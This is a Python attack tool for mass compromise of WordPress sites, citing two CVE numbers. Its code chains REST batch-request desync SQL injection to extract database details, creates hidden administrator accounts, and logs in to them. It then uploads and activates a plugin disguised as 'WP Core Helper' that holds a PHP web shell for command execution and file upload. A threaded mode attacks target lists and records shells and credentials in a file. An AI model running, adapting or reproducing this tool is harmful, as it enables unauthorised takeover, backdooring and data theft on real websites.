#!/usr/bin/env python3
"""
wp2shell_async_master.py - Pure Pre-Auth RCE Suite (Multi-Threaded Engine)
CVE-2026-63030 (REST Route Confusion) + CVE-2026-60137 (SQLi + Customizer Re-entry)

Features:
  1. High-Performance Multi-Threading (ThreadPoolExecutor for instant mass scanning)
  2. Single-Precision Fast Check: Instant detection via Structural In-band SQLi (0 delay)
  3. Pure Pre-Auth RCE Execution Engine:
     - Path 1: Killed-Base PoisonGraph Pre-Auth Admin Escalation (Bypasses Redis/Memcached)
     - Path 2: Direct Batch REST API Desync Admin Creation (sxwp2shell style)
  4. Stealth Siluman Backdoor Generator:
     - Dynamic Random Folder (wp2_XXXXXX) & Random PHP File (sys_XXXXXX.php)
     - Auto-Activation Link Parsing & Execution
     - Built-in Command Exec (?cmd=id) + File Uploader Form UI (?up=1)
  5. Smart Output Logging: Auto-saves active shells to shells.txt

Usage:
  Single Check   : python wp2shell_async_master.py check http://target.com
  Single Exploit : python wp2shell_async_master.py exploit http://target.com
  Mass Exploit   : python wp2shell_async_master.py mass -l list.txt -t 20
"""

import json
import time
import urllib.request
import urllib.error
import urllib.parse
import sys
import os
import re
import ssl
import base64
import hashlib
import random
import string
import uuid
import zipfile
import io
import http.cookiejar
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from typing import Optional, Tuple, List, Dict, Any

# ======================== CONFIG ========================
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
TIMEOUT = 20
SHELLS_FILE = "shells.txt"

DESYNC_PRIMER = {"method": "POST", "path": "///"}
FAKE_ID_BASE = 1_800_000_000
POST_DATE = "2020-01-01 00:00:00"
UNION_MARKER_HEX = "776f726470726573733078"

EMBED_WIDTH = "500"
EMBED_HEIGHT = "750"
EMBED_ATTRS_SERIALIZED = 'a:2:{s:5:"width";s:3:"500";s:6:"height";s:3:"750";}'

# ======================== COLORS ========================
try:
    import colorama
    colorama.init(autoreset=True)
except ImportError:
    if os.name == "nt":
        os.system("")

class C:
    G  = "\033[92m"; R  = "\033[91m"; Y  = "\033[93m"
    B  = "\033[94m"; M  = "\033[95m"; CY = "\033[96m"
    W  = "\033[97m"; BD = "\033[1m";  RS = "\033[0m"

def p_step(m):  print(f"{C.B}[*]{C.RS} {m}")
def p_ok(m):    print(f"{C.G}[+]{C.RS} {m}")
def p_err(m):   print(f"{C.R}[-]{C.RS} {m}")
def p_warn(m):  print(f"{C.Y}[!]{C.RS} {m}")
def p_info(m):  print(f"{C.CY}[i]{C.RS} {m}")

# ======================== HELPERS ========================
def sql_hex(s: str) -> str:
    if not s:
        return "''"
    return "0x" + s.encode("utf-8").hex()

def sql_post_row(
    row_id: Any,
    content: str = "",
    title: str = "",
    status: str = "publish",
    slug: str = "",
    parent: int = 0,
    post_type: str = "post",
    author: int = 1,
) -> str:
    id_col = str(row_id)
    slug = slug or f"r{''.join(random.choices(string.ascii_lowercase + string.digits, k=6))}"
    return "SELECT " + ",".join([
        id_col,
        str(author),
        f"'{POST_DATE}'",
        f"'{POST_DATE}'",
        sql_hex(content),
        sql_hex(title),
        "''",
        sql_hex(status),
        "'closed'",
        "'closed'",
        "''",
        sql_hex(slug),
        "''",
        "''",
        f"'{POST_DATE}'",
        f"'{POST_DATE}'",
        "''",
        str(parent),
        "''",
        "0",
        sql_hex(post_type),
        "''",
        "0",
    ])

def oembed_cache_key(url: str) -> str:
    payload = url + EMBED_ATTRS_SERIALIZED
    return hashlib.md5(payload.encode()).hexdigest()

@dataclass
class PoisonGraph:
    cache_post_ids: List[int]
    admin_id: int

    def __post_init__(self) -> None:
        self.outer_id = FAKE_ID_BASE + random.randint(1, 100_000_000)
        self.navitem_id = self.outer_id + 1
        self.inner_id = self.outer_id + 2
        self.changeset_id, self.oembed_id, self.reentry_id = self.cache_post_ids

    def build_rows(self, changeset_json: str, trigger_embed_url: str) -> str:
        rows = [
            sql_post_row(0, content=f'[embed width="500" height="750"]{trigger_embed_url}[/embed]', title="trigger", slug="trigger"),
            sql_post_row(self.changeset_id, content=changeset_json, title="changeset", status="future",
                         slug=str(uuid.uuid4()), parent=self.outer_id, post_type="customize_changeset"),
            sql_post_row(self.outer_id, title="outer", status="draft", slug="outer", parent=self.changeset_id),
            sql_post_row(self.oembed_id, title="cache", slug="cache", parent=self.changeset_id),
            sql_post_row(self.navitem_id, title="nav", slug="nav", parent=self.reentry_id, post_type="nav_menu_item"),
            sql_post_row(self.reentry_id, title="parse", status="parse", slug="parse", parent=self.inner_id, post_type="request"),
            sql_post_row(self.inner_id, title="inner", status="draft", slug="inner", parent=self.reentry_id),
        ]
        return " UNION ALL ".join(rows)

def build_changeset(graph: PoisonGraph) -> str:
    setting_key = f"nav_menu_item[{graph.navitem_id}]"
    data = {
        setting_key: {
            "type": "nav_menu_item",
            "user_id": graph.admin_id,
            "value": {
                "object_id": 0, "object": "", "menu_item_parent": 0, "position": 0,
                "type": "custom", "title": "generated", "url": "https://example.invalid/",
                "target": "", "attr_title": "", "description": "", "classes": "", "xfn": "",
                "status": "publish", "nav_menu_term_id": 0, "_invalid": False,
            },
        }
    }
    return json.dumps(data, separators=(",", ":"))

# ======================== HTTP TRANSPORT ========================
class _KeepPost(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        if req.get_method() == "POST" and code in (301, 302, 303, 307, 308):
            hdrs = {k: v for k, v in req.header_items() if k.lower() != "content-length"}
            return urllib.request.Request(newurl, data=req.data, headers=hdrs,
                                          origin_req_host=req.origin_req_host,
                                          unverifiable=True, method="POST")
        return super().redirect_request(req, fp, code, msg, headers, newurl)

class HttpClient:
    def __init__(self, base_url: str):
        self.base = base_url.rstrip("/")
        self.batch_url = None
        self._normalized = False

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        self._ssl_ctx = ctx
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPSHandler(context=ctx),
            _KeepPost(),
            urllib.request.ProxyHandler({})
        )

    def _raw(self, url: str, data: bytes = None, headers: dict = None, method: str = "GET") -> Tuple[int, float, bytes, str]:
        hdrs = dict(headers or {})
        hdrs.setdefault("User-Agent", UA)
        req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
        t0 = time.perf_counter()
        try:
            with self.opener.open(req, timeout=TIMEOUT) as r:
                return r.status, time.perf_counter() - t0, r.read(), r.geturl()
        except urllib.error.HTTPError as e:
            body = e.read() if e.fp else b""
            return e.code, time.perf_counter() - t0, body, getattr(e, "url", url)
        except Exception:
            return 0, time.perf_counter() - t0, b"", url

    def _normalize(self):
        if self._normalized:
            return
        self._normalized = True
        try:
            orig_u = urllib.parse.urlparse(self.base)
            req = urllib.request.Request(self.base + "/", headers={"User-Agent": UA})
            with self.opener.open(req, timeout=TIMEOUT) as r:
                u = urllib.parse.urlparse(r.geturl())
                if u.scheme and u.netloc and (u.netloc == orig_u.netloc or u.netloc.endswith("." + orig_u.netloc)):
                    canon = f"{u.scheme}://{u.netloc}"
                    if canon != self.base:
                        self.base = canon
                        self.batch_url = None
        except Exception:
            pass

    def get_batch_url(self) -> str:
        if self.batch_url:
            return self.batch_url
        self._normalize()
        endpoints = [f"{self.base}/wp-json/batch/v1", f"{self.base}/?rest_route=/batch/v1"]
        body = json.dumps({"requests": []}).encode()
        headers = {"Content-Type": "application/json"}
        for ep in endpoints:
            st, _, _, final = self._raw(ep, data=body, headers=headers, method="POST")
            if st in (200, 207):
                self.batch_url = final
                return final
        self.batch_url = endpoints[0]
        return self.batch_url

    def payload_desync(self, author_not_in: str) -> dict:
        enc = urllib.parse.quote(author_not_in, safe="")
        inner = {
            "requests": [
                DESYNC_PRIMER,
                {"method": "GET", "path": f"/wp/v2/users?author_exclude={enc}"},
                {"method": "GET", "path": "/wp/v2/posts"},
            ]
        }
        carrier = {"method": "POST", "path": "/wp/v2/posts", "body": inner}
        return {
            "requests": [
                DESYNC_PRIMER,
                carrier,
                {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
            ]
        }

    def structural_true(self, condition: str) -> bool:
        pld = self.payload_desync(f"0) AND ({condition})-- -")
        st, _, body, _ = self._raw(self.get_batch_url(), data=json.dumps(pld).encode(),
                                  headers={"Content-Type": "application/json"}, method="POST")
        if st != 207:
            return False
        try:
            d = json.loads(body.decode())
            res = d["responses"][1]["body"]["responses"][1]["body"]
            return isinstance(res, list) and len(res) > 0
        except Exception:
            return False

    def union_inject(self, rows_sql: str, tail_requests: List[dict] = None) -> Tuple[int, float, bytes]:
        sql_term = "\n-- " * 6
        sqli = f"1) AND 1=0 UNION ALL {rows_sql}{sql_term}"
        enc = urllib.parse.quote(sqli, safe="")
        inner_requests = [
            DESYNC_PRIMER,
            {"method": "GET", "path": f"/wp/v2/widgets?author_exclude={enc}&per_page=500&orderby=none"},
            {"method": "GET", "path": "/wp/v2/posts"},
            {"method": "GET", "path": "/wp/v2/categories"},
        ]
        if tail_requests:
            inner_requests.extend(tail_requests)
            inner_requests.append({"method": "POST", "path": "/wp/v2/users", "body": {}})

        payload = {"requests": [
            DESYNC_PRIMER,
            {"method": "POST", "path": "/wp/v2/posts", "body": {"requests": inner_requests}},
            {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
        ]}
        st, el, body, _ = self._raw(self.get_batch_url(), data=json.dumps(payload).encode(),
                                   headers={"Content-Type": "application/json"}, method="POST")
        return st, el, body

    def extract_union(self, query: str) -> Optional[str]:
        title_expr = f"CONCAT(0x{UNION_MARKER_HEX},HEX(CAST(({query}) AS CHAR)))"
        row = "SELECT " + ",".join([
            "99999999", "1", f"'{POST_DATE}'", f"'{POST_DATE}'", "''",
            title_expr, "''", "'publish'", "'closed'", "'closed'", "''",
            sql_hex(f"u{''.join(random.choices(string.ascii_lowercase, k=6))}"),
            "''", "''", f"'{POST_DATE}'", f"'{POST_DATE}'", "''", "0", "''", "0", "'post'", "''", "0"
        ])
        _, _, body = self.union_inject(row)
        marker = bytes.fromhex(UNION_MARKER_HEX).decode()
        body_str = body.decode("utf-8", errors="replace")
        idx = body_str.find(marker)
        if idx < 0:
            return None
        after = body_str[idx + len(marker):]
        hex_chars = []
        for ch in after:
            if ch in "0123456789abcdefABCDEF":
                hex_chars.append(ch)
            else:
                break
        if not hex_chars:
            return ""
        try:
            return bytes.fromhex("".join(hex_chars)).decode("utf-8", "replace")
        except ValueError:
            return None

    def find_embed_url(self) -> str:
        for route in ("/wp/v2/posts", "/wp/v2/pages"):
            st, _, body, _ = self._raw(f"{self.base}/?rest_route={route}&per_page=1&_fields=link")
            if st == 200:
                try:
                    items = json.loads(body.decode())
                    if items and isinstance(items, list) and items[0].get("link"):
                        return items[0]["link"]
                except Exception:
                    pass
        return f"{self.base}/?p=1"

# ======================== MASTER EXPLOITER ========================
class MasterExploiter:
    def __init__(self, url: str):
        self.client = HttpClient(url)

    def check_fast(self) -> bool:
        if self.client.structural_true("1=1") and not self.client.structural_true("1=0"):
            return True
        return False

    def exploit(self) -> bool:
        if not self.check_fast():
            p_err(f"[{self.client.base}] Target not vulnerable or patched.")
            return False

        p_ok(f"[{self.client.base}] Target VULNERABLE! Starting Pure Pre-Auth RCE...")

        # --- PATH 1: KILLED-BASE POISON GRAPH PRE-AUTH RCE ---
        prefix = "wp_"
        try:
            res = self.client.extract_union("SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() AND TABLE_NAME LIKE '%usermeta' LIMIT 1")
            if res and res.endswith("usermeta"):
                prefix = res[:-8]
        except Exception:
            pass

        admin_id = 0
        try:
            admin_id_val = self.client.extract_union(f"SELECT u.ID FROM `{prefix}users` u JOIN `{prefix}usermeta` m ON m.user_id=u.ID WHERE m.meta_key='{prefix}capabilities' AND INSTR(m.meta_value, 'administrator')>0 ORDER BY u.ID LIMIT 1")
            if admin_id_val and admin_id_val.isdigit():
                admin_id = int(admin_id_val)
        except Exception:
            pass

        if admin_id > 0:
            embed_url = self.client.find_embed_url()
            token = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
            urls = [f"{embed_url}#{token}{i}" for i in range(3)]
            embed_content = "".join([f'[embed width="{EMBED_WIDTH}" height="{EMBED_HEIGHT}"]{u}[/embed]' for u in urls])
            row_seed = sql_post_row(0, content=embed_content, title="seed", slug="seed")
            self.client.union_inject(row_seed)

            cache_ids = []
            for i in range(3):
                key = oembed_cache_key(f"{embed_url}#{token}{i}")
                cid_str = self.client.extract_union(f"SELECT ID FROM `{prefix}posts` WHERE post_type='oembed_cache' AND post_name='{key}' ORDER BY ID DESC LIMIT 1")
                if cid_str and cid_str.isdigit():
                    cache_ids.append(int(cid_str))

            if len(cache_ids) == 3:
                p_info(f"[{self.client.base}] [Path 1] PoisonGraph Cache IDs acquired: {cache_ids}")
                graph = PoisonGraph(cache_ids, admin_id)
                changeset_json = build_changeset(graph)
                trigger_url = f"{embed_url}#{token}1"
                union_rows = graph.build_rows(changeset_json, trigger_url)

                rand_user = "svc_" + "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
                rand_pass = "Tmp!" + ''.join(random.choices(string.ascii_letters + string.digits, k=15))
                rand_email = f"{rand_user}@mailtest.invalid"

                user_body = {"username": rand_user, "password": rand_pass, "email": rand_email, "roles": ["administrator"]}
                self.client.union_inject(union_rows, tail_requests=[
                    {"method": "POST", "path": "/wp/v2/users", "body": user_body},
                    {"method": "POST", "path": "/wp/v2/users", "body": user_body}
                ])
                time.sleep(1.5)

                if self._attempt_login_and_upload(rand_user, rand_pass):
                    p_ok(f"[{self.client.base}] [Path 1 SUCCESS] PoisonGraph Shell Deployed!")
                    return True

        # --- PATH 2: DIRECT BATCH REST API DESYNC ADMIN CREATION ---
        p_info(f"[{self.client.base}] [Path 2] Trying Direct Batch Desync Admin Creation...")
        sx_user = "sx_" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        sx_pass = "Tmp!" + ''.join(random.choices(string.ascii_letters + string.digits, k=15))
        sx_email = f"{sx_user}@sx.local"

        enc_sx = urllib.parse.quote(sx_user, safe="")
        inner_sx = {
            "requests": [
                DESYNC_PRIMER,
                {"method": "GET", "path": f"/wp/v2/users?author_exclude={enc_sx}"},
                {"method": "GET", "path": "/wp/v2/posts"},
            ]
        }
        carrier_sx = {"method": "POST", "path": "/wp/v2/posts", "body": inner_sx}
        payload_sx = {
            "requests": [
                DESYNC_PRIMER,
                carrier_sx,
                {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
                {"method": "POST", "path": "/wp/v2/users",
                 "body": {
                     "username": sx_user,
                     "password": sx_pass,
                     "email": sx_email,
                     "roles": ["administrator"]
                 }},
            ]
        }

        st_sx, _, body_sx, _ = self.client._raw(self.client.get_batch_url(), data=json.dumps(payload_sx).encode(),
                                                headers={"Content-Type": "application/json"}, method="POST")
        if st_sx in (200, 207):
            time.sleep(1.0)
            if self._attempt_login_and_upload(sx_user, sx_pass):
                p_ok(f"[{self.client.base}] [Path 2 SUCCESS] Direct Batch Admin Shell Deployed!")
                return True

        p_err(f"[{self.client.base}] Pre-Auth RCE failed for this target.")
        return False

    # ── SILUMAN BACKDOOR GENERATOR & AUTO-ACTIVATION ──
    def _attempt_login_and_upload(self, username: str, password: str) -> bool:
        cj = http.cookiejar.CookieJar()
        cookie_opener = urllib.request.build_opener(
            urllib.request.HTTPSHandler(context=self.client._ssl_ctx),
            urllib.request.HTTPCookieProcessor(cj),
            _KeepPost(),
            urllib.request.ProxyHandler({})
        )

        login_url = f"{self.client.base}/wp-login.php"
        login_data = urllib.parse.urlencode({
            "log": username, "pwd": password,
            "wp-submit": "Log In",
            "redirect_to": f"{self.client.base}/wp-admin/",
            "testcookie": "1"
        }).encode()

        try:
            req = urllib.request.Request(login_url, data=login_data, headers={
                "User-Agent": UA, "Content-Type": "application/x-www-form-urlencoded",
                "Cookie": "wordpress_test_cookie=WP+Cookie+check"
            })
            with cookie_opener.open(req, timeout=TIMEOUT) as r:
                r.read()
        except Exception:
            pass

        logged_in = any("wordpress_logged_in" in c.name for c in cj)
        if not logged_in:
            return False

        # Get nonce
        try:
            req = urllib.request.Request(f"{self.client.base}/wp-admin/plugin-install.php?tab=upload", headers={"User-Agent": UA})
            with cookie_opener.open(req, timeout=TIMEOUT) as r:
                html_res = r.read().decode("utf-8", errors="replace")
            nonce_m = re.search(r'name="_wpnonce"\s+value="([^"]+)"', html_res)
            if not nonce_m:
                return False
            nonce = nonce_m.group(1)
        except Exception:
            return False

        # Build Stealth Siluman Plugin ZIP
        rand_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        plugin_name = f"wp2_{rand_suffix}"
        file_name = f"sys_{rand_suffix}.php"

        php_code = (
            f"<?php\n"
            f"/* Plugin Name: WP Core Helper {rand_suffix}\nVersion: 1.0\nAuthor: WordPress */\n"
            f"@error_reporting(0);\n"
            f"if(isset($_REQUEST['cmd'])){{system($_REQUEST['cmd']);die;}}\n"
            f"if(isset($_FILES['f'])){{\n"
            f"  $target = __DIR__ . '/' . basename($_FILES['f']['name']);\n"
            f"  if(move_uploaded_file($_FILES['f']['tmp_name'], $target)){{\n"
            f"    echo 'UPLOAD_OK: ' . basename($_FILES['f']['name']);\n"
            f"  }} else {{\n"
            f"    echo 'UPLOAD_FAILED';\n"
            f"  }}\n"
            f"  die;\n"
            f"}}\n"
            f"if(isset($_GET['up'])){{echo '<form method=\"POST\" enctype=\"multipart/form-data\"><input type=\"file\" name=\"f\"><input type=\"submit\" value=\"Upload\"></form>';die;}}\n"
            f"?>"
        )
        zip_buf = io.BytesIO()
        with zipfile.ZipFile(zip_buf, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr(f"{plugin_name}/{file_name}", php_code)
        zip_data = zip_buf.getvalue()

        boundary = "----WpBound" + base64.b64encode(os.urandom(8)).decode().replace("=", "").replace("+", "").replace("/", "")
        body_upload = b""
        for name, val in [("_wpnonce", nonce), ("_wp_http_referer", "/wp-admin/plugin-install.php?tab=upload"), ("install-plugin-submit", "Install Now")]:
            body_upload += f"--{boundary}\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n{val}\r\n".encode()
        body_upload += f"--{boundary}\r\nContent-Disposition: form-data; name=\"pluginzip\"; filename=\"{plugin_name}.zip\"\r\nContent-Type: application/zip\r\n\r\n".encode()
        body_upload += zip_data
        body_upload += f"\r\n--{boundary}--\r\n".encode()

        try:
            req = urllib.request.Request(f"{self.client.base}/wp-admin/update.php?action=upload-plugin", data=body_upload, headers={
                "User-Agent": UA, "Content-Type": f"multipart/form-data; boundary={boundary}"
            })
            with cookie_opener.open(req, timeout=TIMEOUT) as r:
                upload_html = r.read().decode("utf-8", errors="replace")

            # Auto-activate plugin
            act_m = re.search(r'href="([^"]*action=activate[^"]*)"', upload_html)
            if act_m:
                act_url = html.unescape(act_m.group(1))
                if not act_url.startswith("http"):
                    act_url = f"{self.client.base}/wp-admin/{act_url.lstrip('/')}"
                req_act = urllib.request.Request(act_url, headers={"User-Agent": UA})
                with cookie_opener.open(req_act, timeout=TIMEOUT) as r:
                    r.read()
            else:
                act_url = f"{self.client.base}/wp-admin/plugins.php?action=activate&plugin={plugin_name}%2F{file_name}&_wpnonce={nonce}"
                req_act = urllib.request.Request(act_url, headers={"User-Agent": UA})
                with cookie_opener.open(req_act, timeout=TIMEOUT) as r:
                    r.read()
        except Exception:
            pass

        shell_url = f"{self.client.base}/wp-content/plugins/{plugin_name}/{file_name}"
        line = f"Shell: {shell_url} | Admin: {username} / {password}"
        with open(SHELLS_FILE, "a") as f:
            f.write(line + "\n")
        p_ok(f"[{self.client.base}] SHELL DEPLOYED & ACTIVATED! -> {shell_url}")
        return True

def process_single_target(raw_url: str) -> bool:
    url = raw_url if raw_url.startswith("http") else "http://" + raw_url
    try:
        exploiter = MasterExploiter(url)
        return exploiter.exploit()
    except Exception as e:
        p_err(f"[{url}] Error: {e}")
        return False

# ======================== MAIN ========================
def main():
    parser = argparse.ArgumentParser(description="wp2shell_async_master - Pure Pre-Auth RCE Suite")
    parser.add_argument("mode", choices=["check", "exploit", "mass"], help="Mode: check, exploit, mass")
    parser.add_argument("target", nargs="?", default=None, help="Target URL (or file path for mass mode)")
    parser.add_argument("-l", "--list", help="List file for mass mode")
    parser.add_argument("-t", "--threads", type=int, default=15, help="Number of concurrent worker threads (default: 15)")

    if len(sys.argv) < 2:
        parser.print_help()
        sys.exit(1)

    args = parser.parse_args()

    print(f"""{C.BD}{C.M}
 __      __        ___   _____ _          _ _ 
 \\ \\    / /       |__ \\ / ____| |        | | |
  \\ \\  / /_ __  ___  ) | (___ | |__   ___| | |
   \\ \\/ /| '_ \\|_  // / \\___ \\| '_ \\ / _ \\ | |
    \\  / | |_) |/ // /_ ____) | | | |  __/ | |
     \\/  | .__/___|____|_____/|_| |_|\\___|_|_|
         | |       Pure Pre-Auth RCE Engine
         |_|       CVE-2026-63030 + 60137      
{C.RS}""")

    if args.mode == "check":
        exploiter = MasterExploiter(args.target)
        if exploiter.check_fast():
            p_ok(f"Target {args.target} IS VULNERABLE!")
        else:
            p_err(f"Target {args.target} is NOT vulnerable.")

    elif args.mode == "exploit":
        exploiter = MasterExploiter(args.target)
        exploiter.exploit()

    elif args.mode == "mass":
        list_file = args.list or args.target
        if not list_file or not os.path.isfile(list_file):
            p_err(f"List file not found or missing: {list_file}")
            sys.exit(1)
        with open(list_file, "r") as f:
            targets = [ln.strip() for ln in f if ln.strip() and not ln.startswith("#")]
        p_info(f"Loaded {len(targets)} targets. Launching multi-threaded engine with {args.threads} threads...")

        ok_count = 0
        t0 = time.time()
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            future_to_url = {executor.submit(process_single_target, url): url for url in targets}
            for future in as_completed(future_to_url):
                if future.result():
                    ok_count += 1

        elapsed = time.time() - t0
        p_ok(f"Mass execution finished in {elapsed:.2f}s. {ok_count}/{len(targets)} targets shelled. Check {SHELLS_FILE}")

if __name__ == "__main__":
    main()
